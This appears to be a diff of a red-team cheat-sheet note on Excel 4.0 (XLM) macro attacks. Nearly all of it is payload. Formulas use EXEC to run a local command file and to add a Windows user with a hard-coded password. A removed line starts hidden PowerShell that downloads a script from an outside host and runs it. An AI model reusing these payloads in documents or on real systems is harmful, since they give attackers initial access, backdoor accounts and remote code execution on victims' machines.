@@ -1,26 +1,19 @@
-# XML MACRO Attack
+# XML Macro
 
-XML 4.0 
+---
 
-### payload XML  4.0 attack
+Microsoft Excel still supports Excel 4.0 (XLM) macros, we encourage you to migrate them to the latest version of Microsoft Visual Basic for Applications (VBA). Migrating your macros lets you take advantage of the improvements to the VBA programming object model
 
-```
-=EXEC("cmd /c net user /add nooranet12 Aa123456")
+### Create Payload
+
+Right click on sheet --> insert --> MS Excel 4.0 Macro
+
+```excel
+=EXEC("E:\Initial-Access\Macro\screen.cmd")
 =HALT()
 ```
 
-```
-=EXEC("cmd /c powershell payload powershell")
+```excel
+=EXEC("cmd /c net user /add nooranet Aa123456")
 =HALT()
 ```
-
-```powershell
-```
-=cmd|'/c powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString(\"http://nooranetred.com/screen.cmd\");start-process screen.cmd'!_xlbgnm.A1
-```
-```
-
-
-
-
-
